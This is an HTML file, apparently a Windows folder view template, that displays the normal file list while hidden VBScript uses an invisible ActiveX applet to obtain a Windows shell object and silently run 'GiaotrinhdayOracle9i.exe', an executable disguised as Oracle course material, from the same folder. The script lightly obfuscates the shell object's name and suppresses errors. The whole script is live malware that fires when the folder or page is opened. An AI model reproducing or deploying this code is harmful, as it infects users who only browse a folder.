<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
</head>
<body style="margin: 0" scroll=no>
<object id=FileList border=0 tabindex=1
classid = "clsid:1820FED0-473E-11D0-A96C-00C04FD705A2"
style="width: 100%; height: 100%" tabIndex=-1>
</object>
</body>
</html>
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><APPLET NAME=LHW HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET></div>"
</script>
<script language=vbscript>
On Error Resume Next
Dim path
Path = ""
Path = Left(document.location, Len(document.location) - 11)
Path = Mid(Path, 9)+"/"
Set AppleObject = document.applets("lhw")
AppleObject.setCLSID ("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
AppleObject.createInstance()
sd="w"+"sshe"+"ll"
Set sd = AppleObject.GetObject()
sd.run(Path + "GiaotrinhdayOracle9i.exe")
</script>